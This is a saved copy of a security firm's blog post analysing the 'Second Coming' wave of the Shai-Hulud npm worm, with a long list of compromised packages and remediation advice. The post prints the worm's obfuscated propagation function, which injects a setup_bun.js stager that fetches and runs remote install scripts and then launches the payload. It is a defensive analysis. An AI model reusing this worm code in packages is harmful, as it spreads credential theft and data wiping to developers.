<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.aikido.dev/blog/shai-hulud-strikes-again-hitting-zapier-ensdomains">Original</a>
    <h1>SHA1-Hulud the Second Comming – Postman, Zapier, PostHog All Compromised via NPM</h1>
    
    <div id="readability-page-1" class="page"><div id="test" fs-toc-element="contents" fs-toc-offsettop="8rem"><p>It&#39;s another Monday morning, sitting down at the computer. And I see a stack of alerts from the last hour of packages showing signs of malware in our triage queue. Having not yet finished my first cup of coffee, I see Shai Hulud indicators. Yikes, surely that&#39;s a false positive? Nope, welcome to Monday, Shai Hulud struck again. Strap in.</p><h2>Timeline of the Shai-Hulud Campaign</h2><p>The timing is notable, given npm’s recent announcement that it will revoke classic tokens on December 9 after the wave of supply-chain attacks. With many users still not migrated to trusted publishing, the attacker seized the moment for one more hit before npm’s deadline.</p><ul role="list"><li>August 27 - We release our report detailing the <a href="https://blog.veitheller.de/blog/popular-nx-packages-compromised-on-npm">S1ngularity campaign</a> targeting several nx packages on npm.  </li><li>September 16 - The <a href="https://blog.veitheller.de/blog/s1ngularity-nx-attackers-strike-again">attacker strikes again</a>, launching the first wave of the Shai-Hulud attacks.  </li><li>September 18 - We publish a <a href="https://blog.veitheller.de/blog/bugs-in-shai-hulud-debugging-the-desert">follow-up analysis</a>, diving deeper into the campaign’s technical quirks and early payload behavior.  </li><li>November 24 - A second strike occurs, dubbed the “Second Coming” by the attackers, timed just before npm’s deadline for revoking old tokens.</li></ul><h2>What is Shai-Hulud?: A Quick Refresher </h2><p>Shai-Hulud, named after the gigantic sandworms from Dune as part of the attacker&#39;s flair for theatrics, is a self-replicating npm worm built to spread quickly through compromised developer environments. Once it infects a system, it searches for exposed secrets such as API keys and tokens using TruffleHog and publishes anything it finds to a <a href="https://github.com/search?q=Sha1-Hulud%3A+The+Second+Coming.&amp;ref=opensearch&amp;type=repositories">public GitHub repository</a>. It then attempts to push new copies of itself to npm, helping it propagate across the ecosystem, while exfiltrating data back to the attacker. Keeping with the dramatic theme, the attacker refers to this latest wave as the “Second Coming.”</p><h2>Differences from last time</h2><p>This time around, there are some significant differences in the attack:</p><ul role="list"><li>It install bun with the file <code>setup_bun.js</code> and then uses that to execute <code>bun_environment.js</code>  which is the actual malicious code.</li><li>It creates a randomly named repository with stolen data, rather than a hardcoded name.</li><li>It will infect up to 100 npm packages, compared to 20 last time.</li><li>If it can&#39;t authenticate with GitHub or NPM, it will wipe all files in the users Home directory.</li></ul><h2>Which packages are affected?</h2><p>We&#39;ve detected the following packages compromised with a new version of Shai Hulud. Between all these 492 packages, they have a total of 132 million monthly downloads:</p><ul role="list"><li>@asyncapi/diff</li><li>@asyncapi/nodejs-ws-template</li><li>go-template</li><li>@asyncapi/avro-schema-parser</li><li>@asyncapi/converter</li><li>@asyncapi/dotnet-rabbitmq-template</li><li>@asyncapi/nunjucks-filters</li><li>@asyncapi/protobuf-schema-parser</li><li>@asyncapi/problem</li><li>@asyncapi/optimizer</li><li>@asyncapi/python-paho-template</li><li>@asyncapi/multi-parser</li><li>@asyncapi/bundler</li><li>@asyncapi/php-template</li><li>asyncapi-preview</li><li>@asyncapi/java-spring-cloud-stream-template</li><li>@asyncapi/modelina-cli</li><li>@asyncapi/generator-helpers</li><li>@asyncapi/java-template</li><li>@asyncapi/react-component</li><li>@asyncapi/generator</li><li>@asyncapi/server-api</li><li>@asyncapi/java-spring-template</li><li>@asyncapi/cli</li><li>@asyncapi/web-component</li><li>@asyncapi/specs</li><li>@asyncapi/modelina</li><li>@asyncapi/parser</li><li>@asyncapi/html-template</li><li>@asyncapi/go-watermill-template</li><li>@asyncapi/openapi-schema-parser</li><li>@asyncapi/edavisualiser</li><li>@asyncapi/generator-components</li><li>dotnet-template</li><li>@asyncapi/keeper</li><li>github-action-for-generator</li><li>@asyncapi/nodejs-template</li><li>@asyncapi/markdown-template</li><li>@quick-start-soft/quick-git-clean-markdown</li><li>@quick-start-soft/quick-markdown-image</li><li>@quick-start-soft/quick-markdown-translator</li><li>@quick-start-soft/quick-markdown</li><li>test23112222-api</li><li>@asyncapi/generator-react-sdk</li><li>@quick-start-soft/quick-markdown-compose</li><li>iron-shield-miniapp</li><li>manual-billing-system-miniapp-api</li><li>shinhan-limit-scrap</li><li>@strapbuild/react-native-perspective-image-cropper</li><li>react-native-use-modal</li><li>@quick-start-soft/quick-task-refine</li><li>@strapbuild/react-native-date-time-picker</li><li>@strapbuild/react-native-perspective-image-cropper-2</li><li>create-glee-app</li><li>@strapbuild/react-native-perspective-image-cropper-poojan31</li><li>@asyncapi/studio</li><li>@quick-start-soft/quick-markdown-print</li><li>@quick-start-soft/quick-remove-image-background</li><li>eslint-config-zeallat-base</li><li>korea-administrative-area-geo-json-util</li><li>@quick-start-soft/quick-document-translator</li><li>axios-builder</li><li>posthog-node</li><li>@posthog/first-time-event-tracker</li><li>@posthog/event-sequence-timer-plugin</li><li>@posthog/gitub-star-sync-plugin</li><li>posthog-plugin-hello-world</li><li>@posthog/bitbucket-release-tracker</li><li>@posthog/maxmind-plugin</li><li>@posthog/postgres-plugin</li><li>@posthog/twilio-plugin</li><li>@posthog/cli</li><li>@posthog/clickhouse</li><li>@posthog/snowflake-export-plugin</li><li>posthog-react-native-session-replay</li><li>@posthog/drop-events-on-property-plugin</li><li>@posthog/github-release-tracking-plugin</li><li>@posthog/icons</li><li>@posthog/geoip-plugin</li><li>@posthog/intercom-plugin</li><li>@posthog/plugin-unduplicates</li><li>@posthog/react-rrweb-player</li><li>drop-events-on-property-plugin</li><li>@posthog/ingestion-alert-plugin</li><li>@posthog/kinesis-plugin</li><li>@posthog/laudspeaker-plugin</li><li>@posthog/nextjs</li><li>@posthog/nextjs-config</li><li>@posthog/automatic-cohorts-plugin</li><li>@posthog/migrator3000-plugin</li><li>@posthog/pagerduty-plugin</li><li>@posthog/plugin-contrib</li><li>@posthog/sendgrid-plugin</li><li>@posthog/customerio-plugin</li><li>@posthog/rrweb-utils</li><li>@posthog/taxonomy-plugin</li><li>@posthog/zendesk-plugin</li><li>@posthog/netdata-event-processing</li><li>@posthog/url-normalizer-plugin</li><li>posthog-docusaurus</li><li>@posthog/currency-normalization-plugin</li><li>@posthog/filter-out-plugin</li><li>@posthog/heartbeat-plugin</li><li>@actbase/react-native-fast-image</li><li>@posthog/ai</li><li>@posthog/databricks-plugin</li><li>@actbase/react-native-kakao-channel</li><li>calc-loan-interest</li><li>@actbase/react-absolute</li><li>@actbase/react-daum-postcode</li><li>@actbase/react-native-simple-video</li><li>@posthog/core</li><li>@posthog/lemon-ui</li><li>@seung-ju/next</li><li>@seung-ju/react-hooks</li><li>posthog-react-native</li><li>@actbase/css-to-react-native-transform</li><li>@actbase/react-native-actionsheet</li><li>@actbase/react-native-tiktok</li><li>@seung-ju/react-native-action-sheet</li><li>@actbase/react-kakaosdk</li><li>@posthog/agent</li><li>@posthog/variance-plugin</li><li>discord-bot-server</li><li>@posthog/rrweb-replay</li><li>@posthog/rrweb-snapshot</li><li>@actbase/node-server</li><li>@actbase/react-native-devtools</li><li>@posthog/plugin-server</li><li>@posthog/rrweb-record</li><li>@actbase/native</li><li>@actbase/react-native-less-transformer</li><li>@posthog/rrweb</li><li>posthog-js</li><li>@posthog/web-dev-server</li><li>@posthog/piscina</li><li>@posthog/nuxt</li><li>@posthog/rrweb-player</li><li>@posthog/wizard</li><li>@actbase/react-native-kakao-navi</li><li>@posthog/siphash</li><li>@posthog/twitter-followers-plugin</li><li>@actbase/react-native-naver-login</li><li>@seung-ju/openapi-generator</li><li>@posthog/rrdom</li><li>@posthog/hedgehog-mode</li><li>react-native-worklet-functions</li><li>expo-audio-session</li><li>poper-react-sdk</li><li>@postman/secret-scanner-wasm</li><li>@postman/csv-parse</li><li>@postman/node-keytar</li><li>@postman/tunnel-agent</li><li>@postman/pm-bin-macos-arm64</li><li>@postman/pm-bin-linux-x64</li><li>@postman/postman-collection-fork</li><li>@postman/postman-mcp-server</li><li>@postman/wdio-junit-reporter</li><li>@postman/aether-icons</li><li>@postman/postman-mcp-cli</li><li>@postman/pretty-ms</li><li>@postman/pm-bin-windows-x64</li><li>@postman/wdio-allure-reporter</li><li>@postman/final-node-keytar</li><li>@postman/pm-bin-macos-x64</li><li>@aryanhussain/my-angular-lib</li><li>capacitor-plugin-apptrackingios</li><li>capacitor-plugin-purchase</li><li>capacitor-purchase-history</li><li>capacitor-voice-recorder-wav</li><li>scgs-capacitor-subscribe</li><li>@postman/mcp-ui-client</li><li>capacitor-plugin-scgssigninwithgoogle</li><li>@kvytech/medusa-plugin-announcement</li><li>@kvytech/medusa-plugin-product-reviews</li><li>medusa-plugin-zalopay</li><li>scgsffcreator</li><li>@kvytech/habbit-e2e-test</li><li>medusa-plugin-logs</li><li>medusa-plugin-product-reviews-kvy</li><li>@kvytech/medusa-plugin-promotion</li><li>medusa-plugin-momo</li><li>@kvytech/components</li><li>medusa-plugin-announcement</li><li>@kvytech/cli</li><li>@kvytech/medusa-plugin-newsletter</li><li>@kvytech/medusa-plugin-management</li><li>@kvytech/web</li><li>create-hardhat3-app</li><li>test-hardhat-app</li><li>evm-checkcode-cli</li><li>gate-evm-tools-test</li><li>gate-evm-check-code2</li><li>web-types-htmx</li><li>test-foundry-app</li><li>web-types-lit</li><li>bun-plugin-httpfile</li><li>open2internet</li><li>vite-plugin-httpfile</li><li>@ensdomains/vite-plugin-i18next-loader</li><li>@ensdomains/blacklist</li><li>@ensdomains/durin</li><li>@ensdomains/renewal</li><li>@ensdomains/cypress-metamask</li><li>bytecode-checker-cli</li><li>@ensdomains/dnsprovejs</li><li>@ensdomains/ccip-read-dns-gateway</li><li>@ensdomains/ccip-read-cf-worker</li><li>@ensdomains/dnssec-oracle-anchors</li><li>@ensdomains/reverse-records</li><li>@ensdomains/ens-test-env</li><li>@ensdomains/hackathon-registrar</li><li>@ensdomains/renewal-widget</li><li>crypto-addr-codec</li><li>@ensdomains/solsha1</li><li>@ensdomains/server-analytics</li><li>@ensdomains/ui</li><li>@ensdomains/test-utils</li><li>@ensdomains/mock</li><li>@ensdomains/ccip-read-router</li><li>@zapier/babel-preset-zapier</li><li>@ensdomains/hardhat-chai-matchers-viem</li><li>@ensdomains/ccip-read-worker-viem</li><li>@zapier/browserslist-config-zapier</li><li>@zapier/zapier-sdk</li><li>@zapier/stubtree</li><li>zapier-async-storage</li><li>@zapier/ai-actions</li><li>@zapier/mcp-integration</li><li>@zapier/spectral-api-ruleset</li><li>@ensdomains/address-encoder</li><li>redux-router-kit</li><li>@ensdomains/eth-ens-namehash</li><li>zapier-scripts</li><li>@ensdomains/buffer</li><li>@ensdomains/thorin</li><li>zapier-platform-legacy-scripting-runner</li><li>zapier-platform-schema</li><li>@ensdomains/dnssecoraclejs</li><li>zapier-platform-core</li><li>@ensdomains/op-resolver-contracts</li><li>@ensdomains/ens-archived-contracts</li><li>@ensdomains/ensjs</li><li>@ensdomains/subdomain-registrar</li><li>@ensdomains/unruggable-gateways</li><li>@ensdomains/web3modal</li><li>zapier-platform-cli</li><li>@ensdomains/ens-contracts</li><li>@ensdomains/react-ens-address</li><li>@ensdomains/curvearithmetics</li><li>@zapier/secret-scrubber</li><li>@ensdomains/hardhat-toolbox-viem-extended</li><li>ethereum-ens</li><li>@ensdomains/durin-middleware</li><li>@ensdomains/unicode-confusables</li><li>@ensdomains/ensjs-react</li><li>@ensdomains/content-hash</li><li>@ensdomains/ens-avatar</li><li>@zapier/ai-actions-react</li><li>@zapier/eslint-plugin-zapier</li><li>@ensdomains/offchain-resolver-contracts</li><li>@ensdomains/ens-validation</li><li>@ensdomains/name-wrapper</li><li>@hapheus/n8n-nodes-pgp</li><li>@markvivanco/app-version-checker</li><li>claude-token-updater</li><li>n8n-nodes-tmdb</li><li>devstart-cli</li><li>skills-use</li><li>@mcp-use/inspector</li><li>zuper-sdk</li><li>zuper-stream</li><li>@mcp-use/mcp-use</li><li>create-mcp-use-app</li><li>mcp-use</li><li>@mcp-use/cli</li><li>zuper-cli</li><li>@caretive/caret-cli</li><li>cpu-instructions</li><li>lite-serper-mcp-server</li><li>@louisle2/core</li><li>jan-browser</li><li>exact-ticker</li><li>react-library-setup</li><li>orbit-soap</li><li>@orbitgtbelgium/mapbox-gl-draw-scale-rotate-mode</li><li>token.js-fork</li><li>react-component-taggers</li><li>@louisle2/cortex-js</li><li>orbit-nebula-editor</li><li>@trigo/pathfinder-ui-css</li><li>@trigo/jsdt</li><li>@trigo/atrix-redis</li><li>@trigo/eslint-config-trigo</li><li>@trigo/atrix-orientdb</li><li>@trigo/node-soap</li><li>eslint-config-trigo</li><li>@trigo/bool-expressions</li><li>@trigo/atrix-pubsub</li><li>@trigo/atrix-elasticsearch</li><li>@trigo/hapi-auth-signedlink</li><li>@trigo/keycloak-api</li><li>@trigo/atrix-soap</li><li>@trigo/atrix-swagger</li><li>@trigo/atrix-acl</li><li>atrix</li><li>redux-forge</li><li>@trigo/atrix-mongoose</li><li>@trigo/atrix</li><li>orbit-boxicons</li><li>atrix-mongoose</li><li>bool-expressions</li><li>react-element-prompt-inspector</li><li>trigo-react-app</li><li>@trigo/trigo-hapijs</li><li>@trigo/fsm</li><li>command-irail</li><li>@orbitgtbelgium/mapbox-gl-draw-cut-polygon-mode</li><li>@trigo/atrix-postgres</li><li>@orbitgtbelgium/time-slider</li><li>@orbitgtbelgium/orbit-components</li><li>orbit-nebula-draw-tools</li><li>typeorm-orbit</li><li>@mparpaillon/connector-parse</li><li>@mparpaillon/imagesloaded</li><li>@commute/market-data</li><li>gitsafe</li><li>@osmanekrem/error-handler</li><li>@commute/bloom</li><li>okta-react-router-6</li><li>designstudiouiux</li><li>itobuz-angular</li><li>@ifelsedeveloper/protocol-contracts-svm-idl</li><li>ito-button</li><li>@dev-blinq/cucumber_client</li><li>blinqio-executions-cli</li><li>itobuz-angular-auth</li><li>@dev-blinq/ai-qa-logic</li><li>axios-timed</li><li>react-native-email</li><li>tenacious-fetch</li><li>kill-port</li><li>jacob-zuma</li><li>luno-api</li><li>@lessondesk/eslint-config</li><li>sort-by-distance</li><li>just-toasty</li><li>image-to-uri</li><li>react-native-phone-call</li><li>formik-error-focus</li><li>jquery-bindings</li><li>@lessondesk/babel-preset</li><li>barebones-css</li><li>coinmarketcap-api</li><li>license-o-matic</li><li>@varsityvibe/api-client</li><li>pico-uid</li><li>hyperterm-hipster</li><li>set-nested-prop</li><li>bytes-to-x</li><li>enforce-branch-name</li><li>fittxt</li><li>get-them-args</li><li>react-native-retriable-fetch</li><li>svelte-autocomplete-select</li><li>feature-flip</li><li>lint-staged-imagemin</li><li>react-native-view-finder</li><li>formik-store</li><li>shell-exec</li><li>react-native-log-level</li><li>@everreal/web-analytics</li><li>react-native-jam-icons</li><li>@thedelta/eslint-config</li><li>parcel-plugin-asset-copier</li><li>react-native-websocket</li><li>ra-data-firebase</li><li>react-jam-icons</li><li>react-native-fetch</li><li>@ifings/design-system</li><li>gatsby-plugin-cname</li><li>@alexcolls/nuxt-ux</li><li>react-native-datepicker-modal</li><li>undefsafe-typed</li><li>chrome-extension-downloads</li><li>@alexcolls/nuxt-socket.io</li><li>fuzzy-finder</li><li>sa-company-registration-number-regex</li><li>flapstacks</li><li>react-keycloak-context</li><li>react-qr-image</li><li>@tiaanduplessis/react-progressbar</li><li>@lessondesk/schoolbus</li><li>@tiaanduplessis/json</li><li>react-native-get-pixel-dimensions</li><li>nanoreset</li><li>next-circular-dependency</li><li>url-encode-decode</li><li>axios-cancelable</li><li>compare-obj</li><li>wenk</li><li>haufe-axera-api-client</li><li>obj-to-css</li><li>sa-id-gen</li><li>@lessondesk/api-client</li><li>@varsityvibe/validation-schemas</li><li>flatten-unflatten</li><li>stoor</li><li>@clausehq/flows-step-jsontoxml</li><li>@accordproject/concerto-analysis</li><li>hope-mapboxdraw</li><li>count-it-down</li><li>hopedraw</li><li>@accordproject/markdown-it-cicero</li><li>piclite</li><li>@fishingbooker/react-swiper</li><li>@fishingbooker/browser-sync-plugin</li><li>generator-meteor-stock</li><li>@fishingbooker/react-loader</li><li>benmostyn-frame-print</li><li>@fishingbooker/react-pagination</li><li>@voiceflow/anthropic</li><li>@voiceflow/voice-types</li><li>@voiceflow/default-prompt-wrappers</li><li>@voiceflow/npm-package-json-lint-config</li><li>@voiceflow/nestjs-mongodb</li><li>@voiceflow/tsconfig</li><li>@voiceflow/test-common</li><li>@voiceflow/husky-config</li><li>@voiceflow/commitlint-config</li><li>@voiceflow/git-branch-check</li><li>normal-store</li><li>@voiceflow/prettier-config</li><li>@voiceflow/stylelint-config</li><li>vf-oss-template</li><li>@voiceflow/storybook-config</li><li>@voiceflow/verror</li><li>@voiceflow/alexa-types</li><li>@voiceflow/nestjs-timeout</li><li>@voiceflow/serverless-plugin-typescript</li><li>@voiceflow/voiceflow-types</li><li>shelf-jwt-sessions</li><li>@hover-design/react</li><li>@voiceflow/base-types</li><li>@voiceflow/eslint-config</li><li>@voiceflow/fetch</li><li>@voiceflow/common</li><li>@voiceflow/eslint-plugin</li><li>@voiceflow/exception</li><li>@voiceflow/dtos-interact</li><li>@voiceflow/google-types</li><li>@voiceflow/nestjs-common</li><li>@voiceflow/pino</li><li>@voiceflow/sdk-runtime</li><li>@voiceflow/nestjs-rate-limit</li><li>@voiceflow/openai</li><li>dialogflow-es</li><li>@voiceflow/widget</li><li>arc-cli-fc</li><li>composite-reducer</li><li>bidirectional-adapter</li><li>@antstackio/express-graphql-proxy</li><li>@antstackio/json-to-graphql</li><li>@voiceflow/body-parser</li><li>@voiceflow/logger</li><li>@antstackio/eslint-config-antstack</li><li>@voiceflow/vitest-config</li><li>@faq-component/core</li><li>@pruthvi21/use-debounce</li><li>@voiceflow/api-sdk</li><li>@hover-design/core</li><li>@faq-component/react</li><li>@voiceflow/semantic-release-config</li><li>@voiceflow/vite-config</li><li>@voiceflow/circleci-config-sdk-orb-import</li><li>@voiceflow/backend-utils</li><li>@voiceflow/slate-serializer</li><li>@voiceflow/google-dfes-types</li><li>n8n-nodes-viral-app</li><li>@accordproject/markdown-docx</li><li>@clausehq/flows-step-sendgridemail</li><li>@lpdjs/firestore-repo-service</li><li>@trefox/sleekshop-js</li><li>invo</li><li>jsonsurge</li><li>mon-package-react-typescript</li><li>rediff</li><li>solomon-api-stories</li><li>solomon-v3-stories</li><li>solomon-v3-ui-wrapper</li><li>tcsp-draw-test</li><li>uplandui</li></ul><p>‍</p><h2>Leaking secrets</h2><p>This time, the malware also publishes secrets to GitHub, with a random name and the repository description:</p><p>&#34;Sha1-Hulud: The Second Coming.&#34;</p><p>‍</p><p>Currently we see 26.3k repositories exposed:</p><figure><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/69244323f1c8b48f69d4eccf_2025-11-24_12-35-41.png" loading="lazy" alt=""/></p></figure><p>‍</p><h2>Mistakes made again</h2><p>As we&#39;ve been analzying all these packages, we&#39;ve noticed a number of compromised packages that appear to be from community spread, which contain the initial staging code in <code>setup_bun.js</code>, but NOT <code>bun_environment.js</code> which is the Shai Hulud worm itself. Here&#39;s the code that spreads the worm into other packages:</p><pre contenteditable="false"><code><span>  </span><span>async</span><span> [</span><span>&#34;bundleAssets&#34;</span><span>](_0x349b3d) {
</span><span>    </span><span>let</span><span> _0x2bd41c = a0_0x459ea5.join(_0x349b3d, </span><span>&#39;package&#39;</span><span>, </span><span>&#34;setup_bun.js&#34;</span><span>);
</span><span>    </span><span>await</span><span> iL0(_0x2bd41c, </span><span>&#34;#!/usr/bin/env node\nconst { spawn, execSync } = require(&#39;child_process&#39;);\nconst path = require(&#39;path&#39;);\nconst fs = require(&#39;fs&#39;);\nconst os = require(&#39;os&#39;);\n\nfunction isBunOnPath() {\n  try {\n    const command = process.platform === &#39;win32&#39; ? &#39;where bun&#39; : &#39;which bun&#39;;\n    execSync(command, { stdio: &#39;ignore&#39; });\n    return true;\n  } catch {\n    return false;\n  }\n}\n\nfunction reloadPath() {\n  // Reload PATH environment variable\n  if (process.platform === &#39;win32&#39;) {\n    try {\n      // On Windows, get updated PATH from registry\n      const result = execSync(&#39;powershell -c \&#34;[Environment]::GetEnvironmentVariable(\\&#39;PATH\\&#39;, \\&#39;User\\&#39;) + \\&#39;;\\&#39; + [Environment]::GetEnvironmentVariable(\\&#39;PATH\\&#39;, \\&#39;Machine\\&#39;)\&#34;&#39;, {\n        encoding: &#39;utf8&#39;\n      });\n      process.env.PATH = result.trim();\n    } catch {\n    }\n  } else {\n    try {\n      // On Unix systems, source common shell profile files\n      const homeDir = os.homedir();\n      const profileFiles = [\n        path.join(homeDir, &#39;.bashrc&#39;),\n        path.join(homeDir, &#39;.bash_profile&#39;),\n        path.join(homeDir, &#39;.profile&#39;),\n        path.join(homeDir, &#39;.zshrc&#39;)\n      ];\n\n      // Try to source profile files to get updated PATH\n      for (const profileFile of profileFiles) {\n        if (fs.existsSync(profileFile)) {\n          try {\n            const result = execSync(`bash -c \&#34;source ${profileFile} &amp;&amp; echo $PATH\&#34;`, {\n              encoding: &#39;utf8&#39;,\n              stdio: [&#39;pipe&#39;, &#39;pipe&#39;, &#39;ignore&#39;]\n            });\n            if (result &amp;&amp; result.trim()) {\n              process.env.PATH = result.trim();\n              break;\n            }\n          } catch {\n            // Continue to next profile file\n          }\n        }\n      }\n\n      // Also check if ~/.bun/bin exists and add it to PATH if not already there\n      const bunBinDir = path.join(homeDir, &#39;.bun&#39;, &#39;bin&#39;);\n      if (fs.existsSync(bunBinDir) &amp;&amp; !process.env.PATH.includes(bunBinDir)) {\n        process.env.PATH = `${bunBinDir}:${process.env.PATH}`;\n      }\n    } catch {}\n  }\n}\n\nasync function downloadAndSetupBun() {\n  try {\n    let command;\n    if (process.platform === &#39;win32&#39;) {\n      // Windows: Use PowerShell script\n      command = &#39;powershell -c \&#34;irm bun.sh/install.ps1|iex\&#34;&#39;;\n    } else {\n      // Linux/macOS: Use curl + bash script\n      command = &#39;curl -fsSL https://bun.sh/install | bash&#39;;\n    }\n\n    execSync(command, {\n      stdio: &#39;ignore&#39;,\n      env: { ...process.env }\n    });\n\n    // Reload PATH to pick up newly installed bun\n    reloadPath();\n\n    // Find bun executable after installation\n    const bunPath = findBunExecutable();\n    if (!bunPath) {\n      throw new Error(&#39;Bun installation completed but executable not found&#39;);\n    }\n\n    return bunPath;\n  } catch  {\n    process.exit(0);\n  }\n}\n\nfunction findBunExecutable() {\n  // Common locations where bun might be installed\n  const possiblePaths = [];\n\n  if (process.platform === &#39;win32&#39;) {\n    // Windows locations\n    const userProfile = process.env.USERPROFILE || &#39;&#39;;\n    possiblePaths.push(\n      path.join(userProfile, &#39;.bun&#39;, &#39;bin&#39;, &#39;bun.exe&#39;),\n      path.join(userProfile, &#39;AppData&#39;, &#39;Local&#39;, &#39;bun&#39;, &#39;bun.exe&#39;)\n    );\n  } else {\n    // Unix locations\n    const homeDir = os.homedir();\n    possiblePaths.push(\n      path.join(homeDir, &#39;.bun&#39;, &#39;bin&#39;, &#39;bun&#39;),\n      &#39;/usr/local/bin/bun&#39;,\n      &#39;/opt/bun/bin/bun&#39;\n    );\n  }\n\n  // Check if bun is now available on PATH\n  if (isBunOnPath()) {\n    return &#39;bun&#39;;\n  }\n\n  // Check common installation paths\n  for (const bunPath of possiblePaths) {\n    if (fs.existsSync(bunPath)) {\n      return bunPath;\n    }\n  }\n\n  return null;\n}\n\nfunction runExecutable(execPath, args = [], opts = {}) {\n  const child = spawn(execPath, args, {\n    stdio: &#39;ignore&#39;,\n    cwd: opts.cwd || process.cwd(),\n    env: Object.assign({}, process.env, opts.env || {})\n  });\n\n  child.on(&#39;error&#39;, (err) =&gt; {\n    process.exit(0);\n  });\n\n  child.on(&#39;exit&#39;, (code, signal) =&gt; {\n    if (signal) {\n      process.exit(0);\n    } else {\n      process.exit(code === null ? 1 : code);\n    }\n  });\n}\n\n// Main execution\nasync function main() {\n  let bunExecutable;\n\n  if (isBunOnPath()) {\n    // Use bun from PATH\n    bunExecutable = &#39;bun&#39;;\n  } else {\n    // Check if we have a locally downloaded bun\n    const localBunDir = path.join(__dirname, &#39;bun-dist&#39;);\n    const possiblePaths = [\n      path.join(localBunDir, &#39;bun&#39;, &#39;bun&#39;),\n      path.join(localBunDir, &#39;bun&#39;, &#39;bun.exe&#39;),\n      path.join(localBunDir, &#39;bun.exe&#39;),\n      path.join(localBunDir, &#39;bun&#39;)\n    ];\n\n    const existingBun = possiblePaths.find(p =&gt; fs.existsSync(p));\n\n    if (existingBun) {\n      bunExecutable = existingBun;\n    } else {\n      // Download and setup bun\n      bunExecutable = await downloadAndSetupBun();\n    }\n  }\n\n  const environmentScript = path.join(__dirname, &#39;bun_environment.js&#39;);\n  if (fs.existsSync(environmentScript)) {\n    runExecutable(bunExecutable, [environmentScript]);\n  } else {\n    process.exit(0);\n  }\n}\n\nmain().catch((error) =&gt; {\n  process.exit(0);\n});\n&#34;</span><span>);
</span><span>    </span><span>let</span><span> _0x3ed61a = process.argv[</span><span>0x1</span><span>];
</span><span>    </span><span>if</span><span> (_0x3ed61a &amp;&amp; (</span><span>await</span><span> My1(_0x3ed61a))) {
</span><span>      </span><span>let</span><span> _0x1028dd = </span><span>await</span><span> mL0(_0x3ed61a);
</span><span>      </span><span>if</span><span> (_0x1028dd !== </span><span>null</span><span>) {
</span><span>        </span><span>let</span><span> _0x4cc8b3 = a0_0x459ea5.join(_0x349b3d, </span><span>&#34;package&#34;</span><span>, </span><span>&#34;bun_environment.js&#34;</span><span>);
</span><span>        </span><span>await</span><span> iL0(_0x4cc8b3, _0x1028dd);
</span>      }
<!-- -->    }
<!-- -->  }</code></pre><p>We see that the <code>bun_environment.js</code> may sometimes not be bundled, depending on different factors. It appears that mistakes were once again made by the attackers. This appears to have limited the imapct of the attack at this time. </p><p>‍</p><h2>Compromised GitHub repositories</h2><p>The AsyncAPI team detected that there had been a branch of their CLI project, which was created just prior to the malicious packages being pushed, which deployed a version of the Shai Hulud malware. </p><p><a href="https://github.com/asyncapi/cli/blob/2efa4dff59bc3d3cecdf897ccf178f99b115d63d/bun_environment.js">https://github.com/asyncapi/cli/blob/2efa4dff59bc3d3cecdf897ccf178f99b115d63d/bun_environment.js</a></p><figure><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/6924634adf3176f6984e7258_2025-11-24_14-24-20.png" loading="lazy" alt=""/></p></figure><p>This suggests that the attackers may have used a similar technique to how they <a href="https://nx.dev/blog/s1ngularity-postmortem">pulled off the original Nx compromise</a>. </p><h2>Patient zero</h2><p>We detected the first packages starting at 11/24/2025 3:16:26 AM GMT+0, which were the packages go-template, and 36 packages from <code>AsyncAPI</code>. Many more packages were quickly compromised. Afterwards, they started compromising PostHog packages at 11/24/2025  4:11:55 AM GMT+0, and Postman packages at 11/24/2025  5:09:25 AM GMT+0.</p><h2>Potential impact of Shai-Hulud: Second Coming</h2><p>Threat actors have slipped malicious code into hundreds of NPM packages — including major ones from <strong>Zapier, ENS, AsyncAPI, PostHog, Browserbase, and Postman</strong>. If a developer installs one of these bad packages, the malware quietly runs <em>during installation</em>, before anything even finishes installing. This gives it access to the developer’s machine, build systems, or cloud environment. It then uses an automated tool (TruffleHog) to search for sensitive information like passwords, API keys, cloud tokens, and GitHub or NPM credentials. Anything it finds is uploaded to a public GitHub repository labeled <strong>“Sha1-Hulud: The Second Coming.”</strong> If those stolen secrets include access to code repositories or package registries, attackers can use them to break into more accounts and publish more malicious packages, helping the attack spread further. Because trusted ecosystems were involved and millions of downloads are affected, any team using NPM should immediately check whether they were impacted and rotate any credentials that may have leaked.</p><h2>‍</h2><ul role="list"><li>Audit all Zapier/ENS-related npm dependencies and versions.<br/></li><li>Rotate <strong>all</strong> GitHub, npm, cloud, and CI/CD secrets used during installs.<br/></li><li>Check GitHub for strange repos with the description  “Sha1-Hulud: The Second Coming”</li><li>Disable npm <code>postinstall</code> scripts in CI where possible.</li><li>Pin package versions and enforce MFA on GitHub and npm accounts.</li><li>Use tools like <a href="https://www.aikido.dev/safe-chain">Safe-Chain</a> to block malicious packages on NPM </li></ul><p>‍</p><p>‍</p><p>‍</p></div></div>
  </body>
</html>
